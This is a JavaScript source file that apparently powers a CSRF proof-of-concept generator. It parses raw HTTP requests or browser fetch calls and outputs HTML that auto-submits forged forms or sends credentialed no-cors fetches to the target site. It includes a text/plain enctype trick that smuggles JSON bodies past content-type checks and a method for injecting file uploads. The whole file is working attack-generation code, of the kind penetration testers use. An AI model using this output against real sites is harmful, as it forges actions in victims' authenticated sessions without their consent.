// v1: urlencoded, multipart, and JSON bodies, query params — no cookie fields.

export function htmlAttr(value) {
  return Array.from(String(value))
    .map((char) => {
      const code = char.codePointAt(0)
      if (code < 0x20 || code >= 0x7f) return `&#${code};`
      if (char === '&') return '&amp;'
      if (char === '"') return '&quot;'
      if (char === '<') return '&lt;'
      if (char === '>') return '&gt;'
      return char
    })
    .join('')
}

function collectParams(searchParams) {
  const fields = []
  for (const [name, value] of searchParams) {
    fields.push({ name, value })
  }
  return fields
}

function escapeRegExp(value) {
  return String(value).replace(/[.*+?^${}()|[\]\\]/g, '\\$&')
}

function parseHeaderParam(header, paramName) {
  const match = header.match(
    new RegExp(
      `(?:^|;)\\s*${escapeRegExp(paramName)}\\s*=\\s*(?:"((?:\\\\.|[^"])*)"|([^;\\s]*))`,
      'i'
    )
  )
  if (!match) return null
  if (match[1] != null) return match[1].replace(/\\(.)/g, '$1')
  return match[2]
}

export function parseMultipartBody(body, boundary) {
  const fields = []
  const files = []
  const delimiter = new RegExp(
    `(?:^|\\r?\\n)--${escapeRegExp(boundary)}(--)?[\\t ]*(?:\\r?\\n|$)`,
    'g'
  )
  let previous = null
  let match

  while ((match = delimiter.exec(body)) !== null) {
    if (previous && !previous.closing) {
      parsePart(body.slice(previous.end, match.index))
    }
    previous = { end: delimiter.lastIndex, closing: Boolean(match[1]) }
    if (match[1]) break
  }

  function parsePart(part) {
    const separator = part.search(/\r?\n\r?\n/)
    if (separator < 0) return

    const headerBlock = part.slice(0, separator)
    const partBody = part.slice(separator).replace(/^\r?\n\r?\n/, '')

    const partHeaders = {}
    for (const line of headerBlock.split(/\r?\n/)) {
      const colon = line.indexOf(':')
      if (colon > 0) {
        partHeaders[line.slice(0, colon).trim().toLowerCase()] = line.slice(colon + 1).trim()
      }
    }

    const disposition = partHeaders['content-disposition'] || ''
    const name = parseHeaderParam(disposition, 'name')
    if (name == null) return

    const filename = parseHeaderParam(disposition, 'filename')
    if (filename != null) {
      files.push({
        name,
        filename,
        content: partBody,
        contentType: partHeaders['content-type'] || 'application/octet-stream'
      })
    } else {
      fields.push({ name, value: partBody })
    }
  }

  return { fields, files }
}

function jsString(value) {
  return JSON.stringify(value)
    .replace(/<\/script/gi, '<\\/script')
    .replace(/\u2028/g, '\\u2028')
    .replace(/\u2029/g, '\\u2029')
}

function buildTextPlainFormHtml(method, action, fields) {
  const lines = [
    `<form id="form" action="${htmlAttr(action)}" method="${htmlAttr(method)}" enctype="text/plain">`
  ]
  for (const { name, value } of fields) {
    lines.push(`  <input type="text" name="${htmlAttr(name)}" value="${htmlAttr(value)}">`)
  }
  lines.push(
    `  <button type="submit">Submit</button>`,
    '</form>',
    '<script>form.submit();</script>'
  )
  return lines.join('\n')
}

export function buildJsonTextPlainFields(jsonBody) {
  const serialized = jsonBody.trim()
  let value
  try {
    value = JSON.parse(serialized)
  } catch {
    throw new Error('Invalid JSON body')
  }

  const existingEquals = serialized.indexOf('=')
  if (existingEquals >= 0) {
    return {
      name: serialized.slice(0, existingEquals),
      value: serialized.slice(existingEquals + 1)
    }
  }

  if (value === null || typeof value !== 'object' || Array.isArray(value)) {
    throw new Error('Cannot create a text/plain form for this JSON body')
  }

  let dummyName = '__csrf'
  while (Object.prototype.hasOwnProperty.call(value, dummyName)) dummyName += '_'

  const withoutClosingBrace = serialized.slice(0, -1)
  const separator = withoutClosingBrace.trimEnd().endsWith('{') ? '' : ','
  const payload = `${withoutClosingBrace}${separator}${JSON.stringify(dummyName)}:"="}`
  const equals = payload.lastIndexOf('=')
  return {
    name: payload.slice(0, equals),
    value: payload.slice(equals + 1)
  }
}

function tryParseJsonBody(body) {
  const trimmed = body.trim()
  if (!trimmed) return null
  try {
    JSON.parse(trimmed)
    return body
  } catch {
    return null
  }
}

function parseTextPlainBody(body) {
  const fields = []
  for (const line of body.split('\n')) {
    const normalizedLine = line.endsWith('\r') ? line.slice(0, -1) : line
    if (!normalizedLine) continue
    const eq = normalizedLine.indexOf('=')
    if (eq < 0) continue
    fields.push({ name: normalizedLine.slice(0, eq), value: normalizedLine.slice(eq + 1) })
  }
  return fields
}

function applyBody(headers, body, fields, files) {
  let jsonBody
  let jsonMode
  let enctype
  const contentType = headers['content-type'] || ''
  const mediaType = contentType.split(';', 1)[0].trim().toLowerCase()
  const hasContentType = Object.prototype.hasOwnProperty.call(headers, 'content-type')
  const trimmedBody = body.trim()

  if (mediaType === 'multipart/form-data') {
    enctype = 'multipart/form-data'
    const boundary = parseHeaderParam(contentType, 'boundary')
    if (!boundary && trimmedBody) {
      throw new Error('Missing multipart boundary')
    }
    if (boundary && trimmedBody) {
      const parsed = parseMultipartBody(body, boundary)
      fields.push(...parsed.fields)
      files.push(...parsed.files)
    }
  } else if (trimmedBody) {
    if (mediaType === 'application/x-www-form-urlencoded') {
      fields.push(...collectParams(new URLSearchParams(trimmedBody)))
    } else {
      jsonBody = tryParseJsonBody(body)
    }

    if (jsonBody != null) {
      jsonMode = hasContentType ? 'text/plain' : 'no-content-type'
      enctype = 'text/plain'
    } else if (mediaType === 'text/plain') {
      fields.push(...parseTextPlainBody(body))
      enctype = 'text/plain'
    }
  }

  return { jsonBody, jsonMode, enctype }
}

function assertSupportedMethod(method) {
  if (method !== 'GET' && method !== 'POST') {
    throw new Error(`Unsupported method ${method}: CSRF PoCs only support GET and POST`)
  }
}

const FETCH_CALL_RE =
  /^\s*(?:await\s+)?fetch\s*\(\s*("(?:\\.|[^"\\])*")(?:\s*,\s*(\{[\s\S]*\}))?\s*\)\s*$/

export function parseFetchRequest(raw) {
  const text = raw.trim().replace(/;+\s*$/, '')
  if (!text) {
    throw new Error('Request is empty')
  }

  const match = text.match(FETCH_CALL_RE)
  if (!match) {
    throw new Error('Invalid fetch call')
  }

  let urlString
  let options = {}
  try {
    urlString = JSON.parse(match[1])
    if (match[2]) {
      options = JSON.parse(match[2])
    }
  } catch {
    throw new Error('Invalid browser-generated fetch call')
  }

  let url
  try {
    url = new URL(urlString)
  } catch {
    throw new Error('Invalid fetch URL')
  }

  const method = (options.method || 'GET').toUpperCase()
  assertSupportedMethod(method)
  const headers = {}
  if (options.headers && typeof options.headers === 'object') {
    for (const [name, value] of Object.entries(options.headers)) {
      headers[String(name).toLowerCase()] = String(value)
    }
  }

  let body = ''
  if (options.body != null) {
    if (typeof options.body !== 'string') {
      throw new Error('Unsupported fetch body type')
    }
    body = options.body
  }

  const fields = method === 'GET' ? collectParams(url.searchParams) : []
  const files = []
  const { jsonBody, jsonMode, enctype } = applyBody(headers, body, fields, files)
  const query = method === 'GET' ? '' : url.search
  const action = `${url.protocol}//${url.host}${url.pathname || '/'}${query}`

  return { method, action, fields, files, jsonBody, jsonMode, enctype }
}

export function parseRequest(raw) {
  if (/^\s*(?:await\s+)?fetch\s*\(/i.test(raw.trim())) {
    return parseFetchRequest(raw)
  }
  return parseHttpRequest(raw)
}

export function parseHttpRequest(raw) {
  const text = raw.trimStart()
  if (!text.trim()) {
    throw new Error('Request is empty')
  }

  const separator = text.match(/\r?\n\r?\n/)
  const headerBlock = separator ? text.slice(0, separator.index) : text
  const body = separator ? text.slice(separator.index + separator[0].length) : ''
  const lines = headerBlock.split(/\r?\n/)
  const requestMatch = lines[0].trim().match(/^(\w+)\s+(\S+)\s+HTTP\/[\d.]+$/i)
  if (!requestMatch) {
    throw new Error('Invalid request line')
  }

  const method = requestMatch[1].toUpperCase()
  assertSupportedMethod(method)
  const target = requestMatch[2]

  const headers = {}
  for (let i = 1; i < lines.length; i++) {
    const colon = lines[i].indexOf(':')
    if (colon > 0) {
      const name = lines[i].slice(0, colon).trim().toLowerCase()
      headers[name] = lines[i].slice(colon + 1).trim()
    }
  }

  let scheme = 'https'
  let host
  let pathname
  let query
  let queryParams

  if (/^https?:\/\//i.test(target)) {
    const url = new URL(target)
    scheme = url.protocol.replace(':', '')
    host = url.host
    pathname = url.pathname || '/'
    query = url.search
    queryParams = url.searchParams
  } else {
    const qIndex = target.indexOf('?')
    pathname = qIndex >= 0 ? target.slice(0, qIndex) : target
    if (!pathname.startsWith('/')) pathname = '/' + pathname
    const qs = qIndex >= 0 ? target.slice(qIndex + 1) : ''
    query = qIndex >= 0 ? `?${qs}` : ''
    queryParams = new URLSearchParams(qs)
    host = headers.host
    if (headers['x-forwarded-proto'] === 'http') {
      scheme = 'http'
    }
  }

  const fields = method === 'GET' ? collectParams(queryParams) : []
  const files = []
  const { jsonBody, jsonMode, enctype } = applyBody(headers, body, fields, files)

  const actionPath = `${pathname}${method === 'GET' ? '' : query}`
  const action = host ? `${scheme}://${host}${actionPath}` : actionPath

  return { method, action, fields, files, jsonBody, jsonMode, enctype }
}

function buildFetchHtml(method, action, body) {
  return [
    '<script>',
    `  fetch(${jsString(action)}, {`,
    `    method: ${jsString(method)},`,
    `    mode: 'no-cors',`,
    `    credentials: 'include',`,
    `    body: new Blob([${jsString(body)}])`,
    '  })',
    '</script>'
  ].join('\n')
}

export function buildCsrfFormHtml({
  method,
  action,
  fields,
  files = [],
  jsonBody,
  jsonMode,
  enctype
}) {
  assertSupportedMethod(method)

  if (jsonBody) {
    if (jsonMode === 'no-content-type') {
      return buildFetchHtml(method, action, jsonBody)
    }

    const jsonFields = buildJsonTextPlainFields(jsonBody)
    return buildTextPlainFormHtml(method, action, [jsonFields])
  }

  if (enctype === 'text/plain') {
    return buildTextPlainFormHtml(method, action, fields)
  }

  const hasFiles = files.length > 0
  const formAttrs = ['id="form"', `action="${htmlAttr(action)}"`, `method="${htmlAttr(method)}"`]
  if (enctype === 'multipart/form-data') {
    formAttrs.push('enctype="multipart/form-data"')
  }

  const lines = [`<form ${formAttrs.join(' ')}>`]
  for (const { name, value } of fields) {
    lines.push(`  <input type="hidden" name="${htmlAttr(name)}" value="${htmlAttr(value)}">`)
  }
  for (const { name } of files) {
    lines.push(`  <input type="file" name="${htmlAttr(name)}">`)
  }
  if (!hasFiles) {
    lines.push(`  <button type="submit">Submit</button>`)
  }
  lines.push('</form>', '<script>')

  if (hasFiles) {
    for (let i = 0; i < files.length; i++) {
      const file = files[i]
      lines.push(
        `  const file${i} = new File([${jsString(file.content)}], ${jsString(file.filename)}, { type: ${jsString(file.contentType)} });`
      )
      lines.push(`  const transfer${i} = new DataTransfer();`)
      lines.push(`  transfer${i}.items.add(file${i});`)
      lines.push(`  form.elements[${jsString(file.name)}].files = transfer${i}.files;`)
    }
  }

  lines.push('  form.submit()', '</script>')
  return lines.join('\n')
}
